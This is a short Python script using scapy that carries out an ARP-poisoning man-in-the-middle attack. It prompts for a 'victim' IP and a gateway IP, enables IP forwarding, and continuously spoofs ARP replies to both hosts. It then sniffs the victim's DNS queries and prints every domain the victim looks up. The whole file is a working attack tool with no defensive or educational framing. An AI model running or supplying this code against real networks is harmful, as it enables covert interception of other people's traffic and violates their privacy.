#!/usr/bin/env python
from scapy.all import *
import threading 
import os
import sys
print "make sure you are runing as root "
VIP = raw_input("plese enter the ip address of the victim computer ")
GW = raw_input("please enter the ip address of the gatway ")
IFACE = raw_input("please enter the name of interface  ")
print "\t\t\t\npoisoning victim & gateway!..."
os.system('echo 1 > /proc/sys/net/ipv4/ip_forward')
os.system('service whoopsie stop') ## daisy.ubuntu.com
def dnshandle(pkt):
                 if pkt.haslayer(DNS) and pkt.getlayer(DNS).qr == 0:
                         print 'victim:' +VIP+ 'has searched for :' + pkt.getlayer(DNS).qd.qname
def v_poison():
        v = ARP(pdst=VIP, psrc=GW)
        while True:
                try:
                       send(v,verbose=0,inter=2,loop=1)
                except KeyboardInterrupt:
                        sys.exit(1)
def gw_poison():
        gw = ARP(pdst=GW, psrc=VIP)
        while True:
                try:
                    send(gw,verbose=0,inter=2,loop=1)    
                except KeyboardInterrupt:
                        sys.exit(1)
vthread = []
gwthread = []
while True:

       vpoison = threading.Thread(target=v_poison)
       vpoison.setDaemon(True)
       vthread.append(vpoison)
       vpoison.start()

       gwpoison = threading.Thread(target=gw_poison)
       gwpoison.setDaemon(True)
       gwthread.append(gwpoison)
       gwpoison.start()

       pkt = sniff(iface=IFACE,filter='udp port 53',prn=dnshandle)
